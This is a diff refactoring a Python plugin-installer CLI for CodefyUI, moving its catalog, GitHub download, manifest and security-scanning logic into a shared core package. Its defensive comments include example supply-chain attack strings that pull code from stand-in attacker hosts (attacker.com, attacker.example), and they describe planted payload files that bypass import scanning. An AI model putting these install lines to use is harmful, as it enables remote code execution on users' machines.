@@ -21,10 +21,7 @@ which ``security.allowed_modules`` the user accepted.
 from __future__ import annotations
 
 import argparse
-import importlib.machinery
-import json
 import os
-import re
 import shutil
 import subprocess
 import sys
@@ -34,7 +31,7 @@ import time
 import urllib.request
 from datetime import datetime, timezone
 from pathlib import Path
-from typing import Any, Iterable
+from typing import Any
 from urllib.error import HTTPError, URLError
 
 if sys.version_info >= (3, 11):
@@ -46,14 +43,46 @@ from app.core.plugin_loader import (
     MANIFEST_FILENAME,
     clear_removed,
     load_lockfile,
-    mark_removed,
     plugins_builtin_root,
     plugins_user_root,
     removed_ids,
     save_lockfile,
 )
-from app.core.plugin_validator import PluginValidationError, validate_python_source
-from app.core.script_policy import TIER0_DENIED_ATTRS
+from app.core.plugins import catalog as core_catalog
+from app.core.plugins import consent as core_consent
+from app.core.plugins import deps as core_deps
+from app.core.plugins import github as core_github
+from app.core.plugins import lifecycle as core_lifecycle
+from app.core.plugins import sources as core_sources
+from app.core.plugins.errors import (
+    ConsentRequired,
+    GitHubError,
+    PluginInstallError,
+    UnknownCatalogName,
+    UnparseableSource,
+)
+# The rules live in ``app.core.plugins`` so that the server can read them too;
+# what follows is this module keeping the names it has always exported. The
+# ``X as X`` spelling on the ones this file never calls itself is the
+# explicit-re-export convention -- it marks them as deliberate rather than
+# left over, for the linter and for the next reader.
+from app.core.plugins.gate import (
+    LOADER_SUFFIXES as LOADER_SUFFIXES,
+    SCANNABLE_SUFFIXES as SCANNABLE_SUFFIXES,
+    PluginValidationError,
+    loader_suffix as loader_suffix,
+    validate_nodes_dir as validate_nodes_dir,
+    validate_plugin_dir,
+)
+from app.core.plugins.manifest import (
+    PLUGIN_ID_RE,
+    SUPPORTED_SCHEMA as SUPPORTED_SCHEMA,
+    manifest_capabilities,
+    manifest_has_frontend as _manifest_has_frontend,
+    read_manifest,
+    validate_manifest,
+)
+from app.core.plugins.sources import _GITHUB_SHORT, _GITHUB_URL
 from app.core.security_tiers import (
     CAPABILITIES,
     CAPABILITY_SUMMARY,
@@ -180,81 +209,67 @@ def _capability_line(capability: str) -> str:
     )
 
 
-def manifest_capabilities(manifest: dict[str, Any]) -> tuple[str, ...]:
-    """The normalised ``[security].capabilities`` a manifest declares."""
-    security = manifest.get("security")
-    if not isinstance(security, dict):
-        return ()
-    return normalize_capabilities(security.get("capabilities"))
-
-
 # ── catalog ────────────────────────────────────────────────────────────────
+#
+# Thin wrappers rather than plain re-exports, and deliberately so: the CLI's
+# tests redirect the catalog by patching ``plugins.load_catalog`` and the
+# built-in root by patching ``plugins.plugins_builtin_root``. Reading those
+# through this module's own attributes is what keeps the patch working -- a
+# core function that called its own copy would answer from the real
+# ``registry.json`` while a test believed it had replaced it.
 
 def _catalog_path() -> Path:
-    return plugins_builtin_root() / "registry.json"
+    return core_catalog.catalog_path(plugins_builtin_root())
 
 
 def load_catalog() -> dict[str, Any]:
-    p = _catalog_path()
-    if not p.exists():
-        return {"schema": 1, "plugins": {}}
-    try:
-        return json.loads(p.read_text(encoding="utf-8"))
-    except (json.JSONDecodeError, OSError):
-        return {"schema": 1, "plugins": {}}
+    return core_catalog.load_catalog(plugins_builtin_root())
 
 
 def builtin_catalog_packs() -> dict[str, dict[str, Any]]:
     """The ``kind = "builtin"`` half of the catalog — packs that ship in-repo."""
-    return {
-        pack_id: entry
-        for pack_id, entry in load_catalog().get("plugins", {}).items()
-        if isinstance(entry, dict) and entry.get("kind") == "builtin"
-    }
+    return core_catalog.builtin_catalog_packs(load_catalog())
+
+
+def catalog_entries() -> dict[str, core_catalog.CatalogEntry]:
+    """Every well-formed catalog row, in the shape the installer dispatches on.
+
+    The raw dict is what most of this module reads, because that is what its
+    tests fake; this is the same document run through
+    :func:`~app.core.plugins.catalog.validate_catalog`, which is what turns
+    ``kind`` into a promise -- a ``github`` row that reached here really does
+    carry an ``owner/repo`` and really does not carry a ``path``.
+    """
+    return core_catalog.validate_catalog(load_catalog())
+
+
+def catalog_entry(plugin_id: str) -> core_catalog.CatalogEntry | None:
+    """One catalog row by id, case-insensitively, or ``None``.
+
+    ``None`` means either "no such id" or "that row is malformed" -- the
+    callers here treat both the same way, because a row the validator dropped
+    is a row this build cannot install either.
+    """
+    return catalog_entries().get(plugin_id.lower())
 
 
 def available_builtin_packs() -> list[tuple[str, str]]:
     """Built-in packs shipped on disk that this install has made no decision about.
 
-    A release can add a pack (``stats`` did), and its files land on disk with
-    the update — but the server only loads what the lockfile records, and
-    nothing re-syncs it. So the pack is fully installable and completely
-    invisible: the nodes never appear, and no message anywhere says why.
-
-    "No decision" is the operative phrase (#175): a pack the user uninstalled
-    is subtracted too. Before uninstall left a tombstone, the entry was simply
-    popped, so a removed pack was indistinguishable from one this install had
-    never seen — which is why the notices used to nag about a pack the user had
-    already thrown away, once per start, forever.
-
-    Returns ``(id, display name)`` pairs, sorted, so callers can name them.
+    See :func:`app.core.plugins.catalog.available_builtin_packs` — the rule,
+    and why a pack the user uninstalled is not "available", live there. What
+    is here is the reading: both documents come from this module's own
+    loaders (so a test that fakes them is what gets read), and a failure to
+    read either is swallowed, because every caller is on its way to printing
+    a notice and a notice must never take the command down with it.
     """
     try:
-        catalog = builtin_catalog_packs()
-        lockfile = load_lockfile()
-        installed = lockfile.get("plugins", {})
-        tombstoned = removed_ids(lockfile)
+        return core_catalog.available_builtin_packs(load_catalog(), load_lockfile())
     except Exception:  # never let discoverability break a caller
         return []
-    out: list[tuple[str, str]] = []
-    for pack_id, entry in catalog.items():
-        if pack_id in installed or pack_id in tombstoned:
-            continue
-        out.append((pack_id, str(entry.get("name") or pack_id)))
-    return sorted(out)
 
 
 # ── source parsing ─────────────────────────────────────────────────────────
-
-# Accepts owner/repo or owner/repo@ref; owner/repo names are GitHub-permissible.
-_GITHUB_SHORT = re.compile(r"^([\w.-]+)/([\w.-]+?)(?:@([\w./-]+))?$")
-_GITHUB_URL = re.compile(
-    r"^https?://(?:www\.)?github\.com/([\w.-]+)/([\w.-]+?)(?:\.git)?/?(?:@(.+))?$"
-)
-# One word, no slash and no scheme: the only thing it can have been meant as is
-# a catalog name. See _unknown_catalog_name for why that deserves its own error.
-_BARE_NAME = re.compile(r"^[A-Za-z0-9][\w.-]*$")
-
 
 def _unknown_catalog_name(spec: str, known: list[str]) -> ValueError:
     """The error for a bare word this install's catalog does not have (#363).
@@ -273,7 +288,11 @@ def _unknown_catalog_name(spec: str, known: list[str]) -> ValueError:
             f"這份安裝的內建外掛目錄裡沒有 {spec!r}。",
             f"No plugin pack named {spec!r} in this install's catalog.",
         ),
-        t(f"目前可裝的內建包：{have}", f"Built-in packs available here: {have}"),
+        # "Built-in" was true when the catalog held nothing else. It now
+        # lists the official GitHub packs too, and a heading that calls them
+        # built-in tells a reader who just typed one of their names that they
+        # are looking at the wrong list.
+        t(f"目前可裝的套件：{have}", f"Available packs here: {have}"),
     ]
     if not known:
         lines.append(
@@ -298,443 +317,47 @@ def parse_source(spec: str) -> tuple[str, str, str, str]:
 
     For catalog: ``a`` = plugin id; ``b`` and ``ref`` are empty.
     For github: ``a`` = owner, ``b`` = repo, ``ref`` = tag/branch/sha (may be empty).
+
+    The parsing rule is :func:`app.core.plugins.sources.parse_source`; what is
+    here is the CLI's half of it. The catalog is read through this module (see
+    the wrappers above), and the structured refusal is turned back into the
+    bilingual ``ValueError`` every caller of this function already catches.
     """
     catalog = load_catalog()
-    known = sorted(catalog.get("plugins", {}))
-    if spec.lower() in catalog.get("plugins", {}):
-        return ("catalog", spec.lower(), "", "")
-
-    m = _GITHUB_URL.match(spec)
-    if m:
-        return ("github", m.group(1), m.group(2), m.group(3) or "")
-
-    m = _GITHUB_SHORT.match(spec)
-    if m:
-        return ("github", m.group(1), m.group(2), m.group(3) or "")
-
-    if _BARE_NAME.match(spec):
-        raise _unknown_catalog_name(spec, known)
-
-    # Name the example from the catalog rather than hard-coding it: this line
-    # spent three releases telling people to try "C2" after that pack was gone.
-    example = known[0] if known else "foundations"
-    raise ValueError(
-        t(
-            f"無法解析外掛來源：{spec!r}。請輸入內建包名稱"
-            f"（例如 {example}）、owner/repo[@ref] 或 GitHub URL。",
-            f"Could not parse plugin source: {spec!r}. "
-            f"Expected a catalog name (e.g. {example}), owner/repo[@ref], or a GitHub URL.",
-        )
-    )
+    try:
+        parsed = core_sources.parse_source(spec, catalog=catalog)
+    except UnknownCatalogName as e:
+        raise _unknown_catalog_name(spec, list(e.known)) from None
+    except UnparseableSource:
+        # Name the example from the catalog rather than hard-coding it: this line
+        # spent three releases telling people to try "C2" after that pack was gone.
+        known = sorted(catalog.get("plugins", {}))
+        example = known[0] if known else "foundations"
+        raise ValueError(
+            t(
+                f"無法解析外掛來源：{spec!r}。請輸入內建包名稱"
+                f"（例如 {example}）、owner/repo[@ref] 或 GitHub URL。",
+                f"Could not parse plugin source: {spec!r}. "
+                f"Expected a catalog name (e.g. {example}), owner/repo[@ref], or a GitHub URL.",
+            )
+        ) from None
+    return (parsed.kind, parsed.name_or_owner, parsed.repo, parsed.ref)
 
 
 # ── GitHub helpers ─────────────────────────────────────────────────────────
-
-USER_AGENT = "cdui-plugin-installer/0.1"
-MAX_TARBALL_BYTES = 100 * 1024 * 1024  # 100 MB
-
-
-def _gh_get(url: str, timeout: float = 30.0) -> bytes:
-    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
-    with urllib.request.urlopen(req, timeout=timeout) as resp:
-        return resp.read()
-
-
-def resolve_sha(owner: str, repo: str, ref: str) -> str:
-    """Convert tag / branch / short-sha to a full 40-char SHA."""
-    target = ref or "HEAD"
-    url = f"https://api.github.com/repos/{owner}/{repo}/commits/{target}"
-    try:
-        data = json.loads(_gh_get(url))
-    except HTTPError as e:
-        raise RuntimeError(
-            f"GitHub API returned {e.code} for {owner}/{repo}@{target}: {e.reason}"
-        ) from e
-    except URLError as e:
-        raise RuntimeError(f"GitHub API request failed: {e.reason}") from e
-    sha = data.get("sha")
-    if not sha:
-        raise RuntimeError(
-            f"GitHub API response for {owner}/{repo}@{target} is missing 'sha'"
-        )
-    return sha
-
-
-def download_tarball(owner: str, repo: str, sha: str, dest: Path) -> None:
-    url = f"https://codeload.github.com/{owner}/{repo}/tar.gz/{sha}"
-    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
-    bytes_read = 0
-    with urllib.request.urlopen(req, timeout=60.0) as resp, dest.open("wb") as fout:
-        while True:
-            chunk = resp.read(64 * 1024)
-            if not chunk:
-                break
-            bytes_read += len(chunk)
-            if bytes_read > MAX_TARBALL_BYTES:
-                raise RuntimeError(
-                    f"Tarball exceeds {MAX_TARBALL_BYTES // (1024 * 1024)} MB limit."
-                )
-            fout.write(chunk)
-
-
-# ── manifest ───────────────────────────────────────────────────────────────
-
-PLUGIN_ID_RE = re.compile(r"^[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$")
-SUPPORTED_SCHEMA = 1
-
-
-def read_manifest(plugin_root: Path) -> dict[str, Any]:
-    p = plugin_root / MANIFEST_FILENAME
-    if not p.exists():
-        raise FileNotFoundError(f"Manifest not found at {p}")
-    return tomllib.loads(p.read_text(encoding="utf-8"))
-
-
-def validate_manifest(m: dict[str, Any]) -> None:
-    plugin = m.get("plugin")
-    if not isinstance(plugin, dict):
-        raise ValueError("Manifest is missing required [plugin] table.")
-    schema_version = plugin.get("schema_version")
-    if schema_version != SUPPORTED_SCHEMA:
-        raise ValueError(
-            f"Unsupported plugin schema_version: {schema_version!r}. "
-            "Upgrade cdui or use an older plugin release."
-        )
-    plugin_id = plugin.get("id", "")
-    if not PLUGIN_ID_RE.match(plugin_id):
-        raise ValueError(
-            f"Invalid plugin id: {plugin_id!r}. "
-            "Must match ^[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$"
-        )
-    _validate_security_table(m.get("security"))
-
-
-def _validate_security_table(security: Any) -> None:
-    """Check ``[security]`` before anything acts on it.
-
-    Both keys are lists of strings, and a wrong shape used to fail silently in
-    the worst possible direction: ``allowed_modules = "os"`` reaches
-    ``frozenset("os")``, which is ``{"o", "s"}``, which grants nothing and
-    unlocks nothing while printing "Plugin requests non-default modules: o, s".
-    A manifest is hand-written; say what is wrong with it.
-
-    An unknown capability is an error rather than a no-op. It is either a typo
-    or a manifest written against a newer CodefyUI, and granting nothing then
-    failing at the import would blame the wrong line.
-    """
-    if security is None:
-        return
-    if not isinstance(security, dict):
-        raise ValueError("[security] must be a table.")
-    for key in ("allowed_modules", "capabilities"):
-        value = security.get(key)
-        if value is None:
-            continue
-        if not isinstance(value, list) or not all(isinstance(v, str) for v in value):
-            raise ValueError(
-                f"[security].{key} must be a list of strings, got {value!r}."
-            )
-    unknown = unknown_capabilities(security.get("capabilities"))
-    if unknown:
-        raise ValueError(
-            f"Unknown capability in [security].capabilities: "
-            f"{', '.join(unknown)}. This build knows: {', '.join(CAPABILITIES)}."
-        )
-
-
-def _denied_attributes_for(allowed_modules: list[str]) -> frozenset[str]:
-    """core#179's ``denied_attributes`` set, lifted at Tier 2.
-
-    A method on a value a Tier-0 import hands back (``numpy.zeros(3).dump(
-    path)``) is an arbitrary file write with zero capability declared: the
-    blocklist gate is keyed on Import nodes, so it never sees what an
-    allowed library's return value can do. Already closed for in-canvas
-    scripts via ``TIER0_DENIED_ATTRS`` passed as ``denied_attributes``; this
-    is the same constant, not a re-derived smaller list, so the two surfaces
-    cannot drift on what "closed" means. Deliberately NOT
-    ``SCRIPT_PROXY_DENIED_ATTRS``, which also folds in the module-gateway
-    attrs (``.hub``'s sibling problem, not this one) and the RCE leaves as
-    attributes -- both closed for scripts for reasons specific to an
-    allowlisted, unreviewed surface that do not hold for a file the user
-    chose to install.
-
-    Lifted entirely at Tier 2 (``allowed_modules`` non-empty, which only
-    happens once ``--trust-author`` has already been accepted -- see
-    ``_install_github``, which refuses to call either caller of this
-    function with a non-empty ``allowed`` otherwise). Closing these at Tier
-    0/1 is right: a plugin that declared nothing, or only a capability, gets
-    no new file-write / remote-fetch-and-execute surface for free, and
-    before core#179 a plugin could not even define a method named ``save``
-    without failing installation outright. Refusing them at Tier 2 is
-    incoherent, and the dunder/RCE-leaf precedent (never lifted by any
-    tier -- see the walker's own denied-attrs handling) does not transfer:
-    those rules refuse REFLECTION, which core#133's own docs say no
-    capability ever buys. ``.dump`` / ``.hub`` / ``.save`` are not
-    reflection -- they are file writes and remote code fetches, and
-    ``--trust-author`` has already granted an equivalent or greater version
-    of both by a shorter route (bare ``subprocess`` reaches further than
-    ``numpy.save`` ever could), so refusing the narrower path while granting
-    the wider one protects nothing.
-    """
-    return frozenset() if allowed_modules else TIER0_DENIED_ATTRS
-
-
-# ── core#220: the walk covers what the LOADER covers, by extension ─────────
 #
-# ``validate_plugin_dir`` used to enumerate ``*.py``. The loader imports more
-# than that: ``plugin_loader.install_plugin_finder`` sets the synthetic
-# package's ``__path__`` to the plugin directory, which puts the stock
-# ``FileFinder`` loaders in charge, and those accept every suffix in
-# ``importlib.machinery.all_suffixes()``. Verified on a real interpreter, not
-# reasoned about -- a plugin whose ``nodes/`` held only ``helper.pyc``,
-# ``w.pyw`` and ``native.cp314-win_amd64.pyd``::
-#
-#     loader suffixes:        ['.py', '.pyw', '.pyc', '.cp314-win_amd64.pyd', '.pyd']
-#     files a *.py glob sees: ['__init__.py']            (i.e. none of them)
-#     pkgutil reports:        ['helper', 'native', 'w']  (i.e. all of them)
-#     validate_plugin_dir():  ACCEPTED, no exception
-#
-# ...and the ``.pyc`` then imported and ran its ``os.system`` payload. That is
-# not the gate failing open on a rule; it is the gate never running, which is
-# strictly worse and is why this is keyed on the interpreter's own answer
-# rather than on a hardcoded list -- the same "ask, don't assume" move
-# ``_compute_os_path_module_leaves`` makes for ``os.path``.
-#
-# ``.pyw`` and the extension suffixes are unioned in explicitly ON TOP of
-# ``all_suffixes()`` because that function answers for the CURRENT
-# interpreter, and a tarball is not installed on the machine that built it:
-# ``.pyw`` is a source suffix only on Windows, and ``.so`` / ``.pyd`` /
-# ``.dylib`` each exist on exactly one platform. Scanning the union means the
-# verdict on a given tarball does not depend on which OS ran the installer.
-_EXTRA_SOURCE_SUFFIXES = frozenset({".pyw"})
-_CROSS_PLATFORM_BINARY_SUFFIXES = frozenset({
-    ".pyc", ".pyo", ".pyd", ".so", ".dylib",
-})
+# Plain re-exports, not wrappers: the request rules (the token header, the two
+# shapes of failure, the size cap) live in ``app.core.plugins.github`` so the
+# server obeys them too. These three keep their names here because they are
+# READ here: the two functions through this module's own attributes, so that
+# the install tests replace what ``_install_github`` calls by patching
+# ``plugins.resolve_sha``, and ``USER_AGENT`` by ``_backend_reload`` and by
+# ``scripts/project.py``. Anything else in that module is reached through
+# ``core_github``: a re-export nobody reads is a second name for one rule.
 
-#: Suffixes that are Python SOURCE and can therefore be handed to the AST
-#: gate. ``.pyw`` is ordinary Python text -- only the launcher treats it
-#: differently -- so it is scanned, not refused.
-SCANNABLE_SUFFIXES: frozenset[str] = (
-    frozenset(importlib.machinery.SOURCE_SUFFIXES) | _EXTRA_SOURCE_SUFFIXES
-)
-
-#: Every suffix an ``import`` statement can resolve to a file, anywhere this
-#: tarball might be installed. Asserted against ``all_suffixes()`` by a
-#: standing test, so a future CPython that grows a loader suffix fails loudly
-#: instead of silently widening the hole this closed.
-LOADER_SUFFIXES: frozenset[str] = (
-    frozenset(importlib.machinery.all_suffixes())
-    | SCANNABLE_SUFFIXES
-    | _CROSS_PLATFORM_BINARY_SUFFIXES
-)
-
-
-def loader_suffix(path: Path) -> str | None:
-    """The loader suffix *path* would be imported under, or ``None``.
-
-    Longest match wins, because the extension suffixes nest:
-    ``native.cp314-win_amd64.pyd`` ends with both ``.cp314-win_amd64.pyd``
-    and ``.pyd``, and the longer one is the right answer twice over -- it is
-    what the refusal message should name, and stripping only ``.pyd`` would
-    leave a stem of ``native.cp314-win_amd64``, which the identifier test in
-    :func:`_names_an_importable_module` would then wave through.
-
-    A name that is ONLY a suffix (a file literally called ``.py``) answers
-    ``None``: the stem would be empty, so there is no module name for an
-    ``import`` statement to spell.
-    """
-    name = path.name
-    best: str | None = None
-    for suffix in LOADER_SUFFIXES:
-        if len(name) > len(suffix) and name.endswith(suffix):
-            if best is None or len(suffix) > len(best):
-                best = suffix
-    return best
-
-
-def _names_an_importable_module(path: Path, suffix: str) -> bool:
-    """Whether an ``import`` statement could name the module *path* holds.
-
-    The same structural question ``_VALIDATION_SKIP_DIRS`` asks about
-    ``.git``, applied to a FILE: strip the loader suffix and ask whether what
-    is left is a valid Python identifier. If it is not, no import statement
-    -- absolute or relative -- can name it, so nothing can reach it.
-
-    This exists for exactly one shape, and getting it wrong in either
-    direction is a real failure, so it was verified rather than reasoned
-    about. CPython writes its own bytecode cache as
-    ``__pycache__/real.cpython-314.pyc``; an attacker writes
-    ``__pycache__/payload.pyc``. Both are ``.pyc`` files in the same
-    directory, and they are not the same thing::
-
-        __pycache__/payload.pyc            stem 'payload'          identifier
-        __pycache__/real.cpython-314.pyc   stem 'real.cpython-314' NOT
-
-        pkgutil.iter_modules(__pycache__)          -> ['payload']
-        import <pkg>.nodes.__pycache__.payload     -> OK, ran the bytecode
-        import <pkg>.nodes.__pycache__.real        -> ModuleNotFoundError
-
-    So the refusal has to fire on the first and must NOT fire on the second:
-    a plugin directory that any interpreter has ever imported from has a
-    ``__pycache__`` full of the second kind, including this repo's own
-    built-in packs, and refusing to install over an ordinary compilation
-    artifact would be a false positive with no matching security value.
-
-    Applied only to the suffixes that get REFUSED. Source files are scanned
-    whatever they are called: scanning is never wrong, and the previous
-    ``*.py`` glob scanned an unimportably-named ``my-node.py`` too.
-    """
-    return path.name[: -len(suffix)].isidentifier()
-
-
-def _validate_importable_tree(
-    root: Path,
-    allowed_modules: list[str],
-    capabilities: Iterable[str],
-    *,
-    skip_dirs: frozenset[str] = frozenset(),
-) -> None:
-    """AST-scan every importable source file under *root*; refuse the rest.
-
-    "The rest" is the whole point. A ``.pyc`` cannot be AST-scanned without
-    decompiling it and a ``.pyd`` / ``.so`` cannot be scanned even in
-    principle, so the only two honest answers are "refuse" and "import
-    unexamined code at full trust". This picks the first, by name, with a
-    message that says which file and why -- never a silent skip, which is
-    exactly what the ``*.py`` glob was doing.
-    """
-    if not root.exists():
-        return
-    root_resolved = root.resolve()
-    for path in sorted(root.rglob("*")):
-        if not path.is_file():
-            continue
-        rel_parts = path.resolve().relative_to(root_resolved).parts
-        if skip_dirs and any(part in skip_dirs for part in rel_parts):
-            continue
-        suffix = loader_suffix(path)
-        if suffix is None:
-            continue
-        rel = "/".join(rel_parts)
-        if suffix not in SCANNABLE_SUFFIXES:
-            if not _names_an_importable_module(path, suffix):
-                continue
-            raise PluginValidationError(
-                f"'{rel}' cannot be installed: Python's import system loads "
-                f"'{suffix}' files, but they are compiled rather than source, "
-                f"so the security scan cannot look inside one. Every file a "
-                f"plugin can have imported has to be readable as source -- "
-                f"ship the '.py' this was built from instead"
-            )
-        content = path.read_bytes()
-        if not content.strip():
-            continue
-        validate_python_source(
-            content,
-            path.name,
-            allowed_modules=allowed_modules,
-            capabilities=list(capabilities),
-            denied_attributes=_denied_attributes_for(allowed_modules),
-        )
-
-
-def validate_nodes_dir(
-    nodes_dir: Path,
-    allowed_modules: list[str],
-    capabilities: Iterable[str] = (),
-) -> None:
-    _validate_importable_tree(nodes_dir, allowed_modules, capabilities)
-
-
-# Directories within an extracted plugin tarball that are *not* reachable
-# through Python's import system, whatever the loader's ``__path__`` covers --
-# safe to skip the AST gate because there is no route from an ``import``
-# statement to a file in here. Everything else -- ``examples/``, ``tests/``,
-# ``docs/``, ``assets/``, ``__pycache__``, any other top-level helper -- gets
-# scanned, because ``plugin_loader.install_plugin_finder`` registers the
-# WHOLE plugin directory as a PEP-420 namespace package's ``__path__`` (not
-# only ``nodes/``), so ``from .. import _helpers`` -- or ``from ..tests
-# import payload`` -- from inside a scanned ``nodes/foo.py`` would otherwise
-# pull in unscanned code at full trust, automatically, at server boot or
-# reload (core#182).
-#
-# ``__pycache__`` is deliberately NOT on this set, despite an earlier version
-# of this comment claiming it was safe to skip because "a real __pycache__
-# never holds a *.py this glob would match." That is true of the directory
-# CPython writes and irrelevant here: the attacker supplies the tarball, so
-# `__pycache__/payload.py` exists because they put it there, and
-# `"__pycache__".isidentifier()` is `True` -- PEP-420 namespace resolution
-# imports it exactly like any other directory name. Verified directly, not
-# merely argued: with a plugin installed through the real loader, both
-# `importlib.import_module("cdui_plugins.<id>.__pycache__.payload")` and a
-# relative `from ..__pycache__ import payload` inside `nodes/` resolve to the
-# planted file, and `validate_plugin_dir` (before this fix) accepted it
-# silently. Reasoning about what a directory name conventionally holds is not
-# the same claim as reasoning about what Python's import system can reach,
-# and only the second one is what this set is for.
-#
-# ``.git`` is the one name that passes that test for real: `.git` is not a
-# valid identifier (`".git".isidentifier()` is `False`, and `.` cannot appear
-# inside one), so no `import` statement -- absolute or relative -- can ever
-# name a package component spelled that way. That is a structural guarantee
-# independent of what is inside the directory, which is the property this
-# set exists to require before trusting a name to be un-scanned.
-#
-# Narrowing the LOADER's ``__path__`` instead, so a skipped directory were
-# unreachable rather than merely unscanned, was considered and rejected:
-# PEP-420 namespace packages have no native "every subdirectory except these"
-# carve-out, so that route needs a custom import finder/loader -- new import
-# machinery, not an extension of either existing one -- for a difference this
-# scan already erases by scanning first.
-_VALIDATION_SKIP_DIRS = frozenset({".git"})
-
-
-def validate_plugin_dir(
-    plugin_root: Path,
-    allowed_modules: list[str],
-    capabilities: Iterable[str] = (),
-) -> None:
-    """Walk the entire plugin directory and validate every importable file.
-
-    The original ``validate_nodes_dir`` only checked ``nodes/`` which left a
-    bypass via top-level helpers. This visits every file in the tree that
-    Python's import system could load, except the ones under
-    :data:`_VALIDATION_SKIP_DIRS` -- ``.git`` alone, the one name provably
-    unreachable through Python's import system (not a valid identifier, so
-    no ``import`` can ever name it). Nothing else is skipped: ``examples/``,
-    ``tests/``, ``docs/``, ``assets/`` and ``__pycache__`` all get scanned
-    too (core#182), because the plugin loader registers the WHOLE directory
-    as a namespace package's ``__path__``, so a scanned ``nodes/foo.py`` can
-    ``from ..tests import payload`` -- or ``from ..__pycache__ import
-    payload`` -- into any of them.
-
-    "Every file the import system could load" is by EXTENSION as well as by
-    directory since core#220: this used to glob ``*.py`` while the loader
-    also accepts ``.pyw``, ``.pyc`` and ``.pyd`` / ``.so``, so a plugin
-    shipping ``nodes/helper.pyc`` and no ``helper.py`` was never scanned at
-    all -- the gate did not fail open, it never ran. Source suffixes are
-    scanned; compiled ones are refused by name (see
-    :func:`_validate_importable_tree`), because a plugin has no legitimate
-    reason to ship a bytecode-only or binary module through this path and
-    neither can be AST-scanned.
-
-    *capabilities* are the ones the user confirmed at install time. They are
-    passed to every file rather than per-file, because a capability is a
-    property of the INSTALL, not of a source file: a plugin granted
-    ``network`` may reach it from wherever it likes inside its own tree.
-
-    *allowed_modules* also lifts the ``denied_attributes`` closed by
-    core#179 -- see :func:`_denied_attributes_for` -- because a non-empty
-    list here only happens once ``--trust-author`` has already been
-    accepted, and refusing ``arr.dump()`` to a plugin trusted with
-    ``subprocess`` protects nothing.
-    """
-    _validate_importable_tree(
-        plugin_root,
-        allowed_modules,
-        capabilities,
-        skip_dirs=_VALIDATION_SKIP_DIRS,
-    )
+USER_AGENT = core_github.USER_AGENT
+resolve_sha = core_github.resolve_sha
+download_tarball = core_github.download_tarball
 
 
 # ── runtime helpers ────────────────────────────────────────────────────────
@@ -822,52 +445,13 @@ def _backend_reload() -> bool:
         return False
 
 
-# PEP 508 distribution names: letters / digits / underscore / hyphen / period.
-# Anything else (especially ``@``, ``git+``, ``http``, whitespace, semicolon)
-# is rejected to block supply-chain RCE via the dep installer
-# (``"evil @ git+https://attacker.com/evil"`` → ``uv pip install`` runs the
-# attacker's ``setup.py`` regardless of how strict the AST gate is).
-_SAFE_DEP_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,62}$")
-
-# PEP 440 version specifier characters. We don't fully parse — we just refuse
-# anything that *isn't* whitespace, digits, dots, commas, parens, and the
-# canonical comparison operators.
-_SAFE_DEP_VERSION = re.compile(r"^[\s\d.,()<>=!~*+a-zA-Z\-]*$")
-
-
-class _UnsafeDepSpec(ValueError):
-    """Raised when a plugin manifest's python_deps entry isn't a plain
-    distribution name + version constraint."""
-
-
-def _build_dep_spec(name: str, ver: str) -> str:
-    """Turn a (name, version) pair into a vetted ``foo==1.2.3``-style string.
-
-    Rejects PEP 508 extras (``foo[extra]``), URL specifiers (``foo @ url``),
-    and any name with non-distribution-safe characters. Returning the spec as
-    a list element for ``uv pip install`` is safe because we never invoke a
-    shell — but ``uv`` itself would happily fetch ``git+`` URLs given the
-    chance, and that's exactly what we're blocking here.
-    """
-    if not isinstance(name, str) or not _SAFE_DEP_NAME.match(name):
-        raise _UnsafeDepSpec(
-            f"Invalid python_deps name {name!r} — must match {_SAFE_DEP_NAME.pattern!r}"
-        )
-    if not isinstance(ver, str):
-        ver = ""
-    if ver and not _SAFE_DEP_VERSION.match(ver):
-        raise _UnsafeDepSpec(
-            f"Invalid python_deps version constraint for {name!r}: {ver!r}"
-        )
-    if not ver:
-        return name
-    if ver[:1] in (">", "<", "=", "~", "!"):
-        return f"{name}{ver}"
-    return f"{name}=={ver}"
-
-
 def _install_deps(deps: dict[str, str]) -> int:
     """Install ``python_deps`` via ``uv pip`` into the codefyui venv.
+
+    The vetting that keeps a manifest's ``[python_deps]`` from becoming
+    ``uv pip install git+https://attacker.example/evil`` is
+    :func:`app.core.plugins.deps.dep_specs`; every spec this command runs
+    comes back through it.
 
     Targets the current interpreter explicitly with ``--python sys.executable``.
     ``cdui``/``dev.py`` re-exec into ``backend/.venv`` before running plugin
@@ -877,13 +461,11 @@ def _install_deps(deps: dict[str, str]) -> int:
     fail with "No virtual environment found". Pinning ``--python`` removes the
     cwd dependency.
     """
-    specs: list[str] = []
-    for name, ver in deps.items():
-        try:
-            specs.append(_build_dep_spec(name, ver))
-        except _UnsafeDepSpec as e:
-            err(str(e), str(e))
-            return 1
+    try:
+        specs = core_deps.dep_specs(deps)
+    except PluginInstallError as e:
+        err(str(e), str(e))
+        return 1
     cmd = ["uv", "pip", "install", "--python", sys.executable, *specs]
     info(
         f"執行：{' '.join(cmd)}",
@@ -943,6 +525,11 @@ def capability_gate(
     The declared set is checked against this build's vocabulary first;
     ``validate_manifest`` already refuses an unknown name, so reaching one
     here means a caller skipped it, and refusing is the safe reading.
+
+    Which capabilities are covered, and which are new since the version the
+    user consented to, is :func:`app.core.plugins.consent.decide_capabilities`
+    -- the same arithmetic a dialog will do. What is here is the
+    conversation: the printing, the prompt, and the refusal.
     """
     requested = manifest_capabilities(manifest)
     if not requested:
@@ -958,11 +545,21 @@ def capability_gate(
         )
         return CAPABILITIES_REFUSED
 
-    prior = set(normalize_capabilities(getattr(args, "prior_capabilities", None)))
-    if set(requested) <= prior:
+    # ``decide_capabilities`` tells "installed before and granted nothing"
+    # (``()``) from "never installed" (``None``), because only the first
+    # makes an unchanged request into growth worth warning about. The CLI
+    # deliberately collapses them with ``or None``: every caller here passes
+    # a list, an empty one arrives from an install that recorded nothing as
+    # readily as from an update that granted nothing, and treating that as an
+    # empty GRANT would print "this is more than last time" for a first
+    # install. Keeping today's output is the reason; a route with a real
+    # lockfile behind it can pass the distinction through.
+    prior = normalize_capabilities(getattr(args, "prior_capabilities", None))
+    decision = core_consent.decide_capabilities(requested, prior=prior or None)
+    if not decision.missing:
         info(
-            f"沿用先前授權的能力：{', '.join(requested)}",
-            f"Re-using previously granted capabilities: {', '.join(requested)}",
+            f"沿用先前授權的能力：{', '.join(decision.granted)}",
+            f"Re-using previously granted capabilities: {', '.join(decision.granted)}",
         )
